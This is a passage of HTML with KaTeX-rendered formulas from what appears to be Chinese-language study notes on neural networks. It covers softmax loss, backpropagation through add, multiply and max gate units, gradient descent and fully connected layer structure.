class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.911em;\"><span style=\"top:-2.6447em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mop mtight\"><span class=\"mop op-symbol small-op mtight\" style=\"position:relative;top:0em;\">∑</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1496em;\"><span style=\"top:-2.1786em;margin-left:0em;margin-right:0.0714em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.4603em;\"><span></span></span></span></span></span></span><span class=\"mspace mtight\" style=\"margin-right:0.1952em;\"></span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">e</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.779em;\"><span style=\"top:-2.9714em;margin-right:0.0714em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">s</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3448em;\"><span style=\"top:-2.3448em;margin-left:0em;margin-right:0.1em;\"><span class=\"pstrut\" style=\"height:2.6595em;\"></span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.5092em;\"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.394em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">e</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7385em;\"><span style=\"top:-2.931em;margin-right:0.0714em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">s</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3448em;\"><span style=\"top:-2.3448em;margin-left:0em;margin-right:0.1em;\"><span class=\"pstrut\" style=\"height:2.6944em;\"></span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3496em;\"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.6775em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span></span></span></span></span>，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>s</mi><mo>=</mo><mi>f</mi><mo stretchy=\"false\">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo separator=\"true\">,</mo><mi>W</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">s=f(x_i,W)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">s</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"mclose\">)</span></span></span></span>)</li>\n<li>计算损失值： (<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>L</mi><mi>i</mi></msub><mo>=</mo><mo>−</mo><mi>log</mi><mo>⁡</mo><mi>P</mi><mo stretchy=\"false\">(</mo><mi>Y</mi><mo>=</mo><msub><mi>y</mi><mi>i</mi></msub><mi mathvariant=\"normal\">∣</mi><mi>X</mi><mo>=</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">{L_i=-\\log P(Y=y_i|X=x_i)}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">L</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mord\">−</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mop\">lo<span style=\"margin-right:0.01389em;\">g</span></span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\">∣</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span></span>)</li>\n</ol>\n<h2 id=\"反向传播\"><a class=\"anchor\" href=\"#反向传播\">#</a> 反向传播</h2>\n<p><strong>反向传播</strong>：优化模型（找到使 <strong>损失值</strong> 最小的 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>W</mi></mrow><annotation encoding=\"application/x-tex\">W</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6833em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span></span></span></span>）</p>\n<p><strong>梯度下降算法</strong>：判断损失值是否达到最小，否则进行优化：<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>W</mi><mo>=</mo><mi>W</mi><mo>+</mo><mtext>梯度反方向</mtext><mo>×</mo><mtext>某一固定值</mtext><mi>α</mi></mrow><annotation encoding=\"application/x-tex\">W=W+梯度反方向\\times某一固定值 \\alpha</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6833em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.7667em;vertical-align:-0.0833em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.7667em;vertical-align:-0.0833em;\"></span><span class=\"mord cjk_fallback\">梯度反方向</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.6833em;\"></span><span class=\"mord cjk_fallback\">某一固定值</span><span class=\"mord mathnormal\" style=\"margin-right:0.0037em;\">α</span></span></span></span></p>\n<blockquote>\n<p>反向传播遵循<strong>链式法则</strong>：梯度是从后往前、逐层传播的</p>\n<p>沿着输出层的 输出结果 的计算顺序的 <strong>倒序</strong> 进行反向传播<br />\n =&gt; 比如 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">[</mo><mo stretchy=\"false\">(</mo><mi>x</mi><mo>⋅</mo><msub><mi>W</mi><mn>1</mn></msub><mo stretchy=\"false\">)</mo><mo>⋅</mo><msub><mi>W</mi><mn>2</mn></msub><mo stretchy=\"false\">]</mo><mo>⋅</mo><msub><mi>W</mi><mn>3</mn></msub></mrow><annotation encoding=\"application/x-tex\">[(x\\cdot W_1)\\cdot W_2]\\cdot W_3</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">[(</span><span class=\"mord mathnormal\">x</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">]</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">3</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>，则反向传播时 先计算 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>W</mi><mn>3</mn></msub></mrow><annotation encoding=\"application/x-tex\">W_3</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">3</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 的梯度。</p>\n<p>整个过程可以划分出多个<strong>门单元</strong>：</p>\n<ol>\n<li>正向传播中，下一门单元的输入数据 为 上一个门单元的输出数据</li>\n<li>反向传播从最后一个门单元开始，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mtext>当前门单元的梯度</mtext><mo>=</mo><mtext>当前门单元的梯度计算值</mtext><mo>×</mo><mtext>后面门单元传递来的梯度</mtext></mrow><annotation encoding=\"application/x-tex\">当前门单元的梯度 = 当前门单元的梯度计算值 \\times 后面门单元传递来的梯度</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6833em;\"></span><span class=\"mord cjk_fallback\">当前门单元的梯度</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.7667em;vertical-align:-0.0833em;\"></span><span class=\"mord cjk_fallback\">当前门单元的梯度计算值</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.6833em;\"></span><span class=\"mord cjk_fallback\">后面门单元传递来的梯度</span></span></span></span></li>\n</ol>\n</blockquote>\n<p>如下图，红框中的部分就是一个门单元；<br />\n箭头上方的绿色部分为前向传播的内容，表示当前门单元的输出（也是下一个门单元的输入）；<br />\n箭头下方的红色部分为反向传播的内容，表示上一个门单元计算得到的梯度。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1706962601/Typera/2024/02/efbd2d8e65503cb6628c39829ea5c854.png\" alt=\"image-20240203201632095\" /></p>\n<blockquote>\n<p>门单元：（一种操作）</p>\n<ol>\n<li>加法门单元：<br />\n对于 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>x</mi><mo>+</mo><mi>y</mi><mo>=</mo><mi>q</mi></mrow><annotation encoding=\"application/x-tex\">x+y=q</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6667em;vertical-align:-0.0833em;\"></span><span class=\"mord mathnormal\">x</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.1944em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.1944em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span></span></span></span>，因为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>q</mi></mrow><annotation encoding=\"application/x-tex\">q</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.1944em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span></span></span></span> 对 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">x</span></span></span></span> 和 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>y</mi></mrow><annotation encoding=\"application/x-tex\">y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.1944em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span></span></span></span> 求偏导的值都是 1，所以 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">x</span></span></span></span> 和 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>y</mi></mrow><annotation encoding=\"application/x-tex\">y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.1944em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span></span></span></span> 向后传播的梯度不变。<br />\n(后面传来的梯度会<strong>均匀</strong>地分给 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">x</span></span></span></span> 和 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>y</mi></mrow><annotation encoding=\"application/x-tex\">y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.1944em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span></span></span></span> )</li>\n<li>乘法门单元：<br />\n对于 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>x</mi><mo>×</mo><mi>y</mi><mo>=</mo><mi>q</mi></mrow><annotation encoding=\"application/x-tex\">x\\times y=q</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6667em;vertical-align:-0.0833em;\"></span><span class=\"mord mathnormal\">x</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.1944em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.1944em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span></span></span></span>，因为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>q</mi></mrow><annotation encoding=\"application/x-tex\">q</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.1944em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span></span></span></span> 对 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">x</span></span></span></span> 求偏导为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>y</mi></mrow><annotation encoding=\"application/x-tex\">y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.1944em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span></span></span></span>，对 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>y</mi></mrow><annotation encoding=\"application/x-tex\">y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.1944em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span></span></span></span> 求偏导为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">x</span></span></span></span> ，所以 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>x</mi><mtext>向后传播的梯度</mtext><mo>=</mo><mtext>后面传来的梯度</mtext><mo>×</mo><mi>y</mi></mrow><annotation encoding=\"application/x-tex\">x向后传播的梯度=后面传来的梯度\\times y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6833em;\"></span><span class=\"mord mathnormal\">x</span><span class=\"mord cjk_fallback\">向后传播的梯度</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.7667em;vertical-align:-0.0833em;\"></span><span class=\"mord cjk_fallback\">后面传来的梯度</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.1944em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span></span></span></span><br />\n(<strong>互换</strong>)</li>\n<li>MAX 门单元：<br />\n后面传来的梯度 只会 传递给输入值 <strong>最大的</strong> 那一项，其余小的项的梯度均为 0。</li>\n</ol>\n</blockquote>\n<h2 id=\"整体架构\"><a class=\"anchor\" href=\"#整体架构\">#</a> 整体架构</h2>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1706971673/Typera/2024/02/9cd7dcdbbe0019618b6bf8a4fa68883a.png\" alt=\"image-20240203224749357\" /></p>\n<blockquote>\n<ul>\n<li>\n<p><strong>层次结构</strong>：神经网络是分层的。每一层在前一层的基础上 <strong>对数据进行变换</strong>。</p>\n</li>\n<li>\n<p><strong>神经元</strong>：数据的特征数量。比如输入层有 3 个神经元，其实表示输入数据为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">[</mo><mi>n</mi><mo separator=\"true\">,</mo><mn>3</mn><mo stretchy=\"false\">]</mo></mrow><annotation encoding=\"application/x-tex\">[n,3]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">[</span><span class=\"mord mathnormal\">n</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\">3</span><span class=\"mclose\">]</span></span></span></span> 的矩阵，即存在 3 个特征。<br />\n（隐藏层 1 中有 4 个特征，隐藏层 2 同理）</p>\n</li>\n<li>\n<p><strong>全连接</strong>：对于中间的每一层的神经元，都与前一层每个神经元连接起来。<br />\n（连接：权重参数矩阵，如上图 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>W</mi><mn>1</mn></msub></mrow><annotation encoding=\"application/x-tex\">W_1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">[</mo><mn>3</mn><mo separator=\"true\">,</mo><mn>4</mn><mo stretchy=\"false\">]</mo></mrow><annotation encoding=\"application/x-tex\">[3,4]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">[</span><span class=\"mord\">3</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\">4</span><span class=\"mclose\">]</span></span></span></span>，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>W</mi><mn>2</mn></msub><mtext>为</mtext><mo stretchy=\"false\">[</mo><mn>4</mn><mo separator=\"true\">,</mo><mn>4</mn><mo stretchy=\"false\">]</mo></mrow><annotation 